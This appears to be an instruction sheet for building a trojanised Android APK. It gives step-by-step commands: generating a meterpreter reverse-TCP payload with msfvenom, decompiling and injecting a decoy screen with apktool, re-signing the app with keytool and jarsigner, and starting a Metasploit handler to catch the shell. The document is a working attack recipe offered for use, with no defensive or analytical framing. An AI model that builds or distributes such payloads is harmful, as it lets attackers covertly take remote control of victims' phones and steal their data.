Payload Builder Instructions:

Follow these steps to build the APK payload for Android devices.


1. Generate Reverse Shell

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o base.apk
```

---

2. Decompile APK

```bash
apktool d base.apk -o hacked_source
```

---

3. Inject Decoy Screen   (Edit the "src" jpg link of picture or gif to change)

- Place `hacked_screen.xml` into:
  ```
  hacked_source/res/layout/
  ```

- Edit the smali code for MainActivity (instructions in `apktool_instructions.txt`)

---

4. Rebuild and Sign

```bash
apktool b hacked_source -o hacked_payload.apk

keytool -genkey -v -keystore hacked.keystore -alias hackedkey -keyalg RSA -keysize 2048 -validity 10000

jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore hacked.keystore hacked_payload.apk hackedkey
```

---

5. Setup Listener

```bash
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
run
```
